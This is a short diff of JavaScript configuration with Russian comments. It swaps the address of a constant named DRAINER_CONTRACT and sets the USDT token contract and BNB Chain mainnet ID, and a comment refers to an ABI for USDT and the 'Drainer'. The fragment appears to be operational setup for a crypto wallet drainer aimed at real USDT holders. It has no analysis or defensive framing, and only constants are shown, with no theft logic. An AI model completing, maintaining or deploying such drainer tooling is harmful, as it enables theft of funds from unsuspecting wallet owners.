@@ -1,6 +1,6 @@
 // Конфигурация
 const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT на BNB Chain
-const DRAINER_CONTRACT = "0x048897c815495186FAA21a8fFA0E77CE3cB56c5D"; // Адрес верифицированного контракта
+const DRAINER_CONTRACT = "0x734BB1cb78Cf8b2e657Db8c1319A61A626B98393"; // Адрес верифицированного контракта
 const CHAIN_ID = 56; // BNB Chain Mainnet
 
 // Минимальный ABI для USDT и Drainer
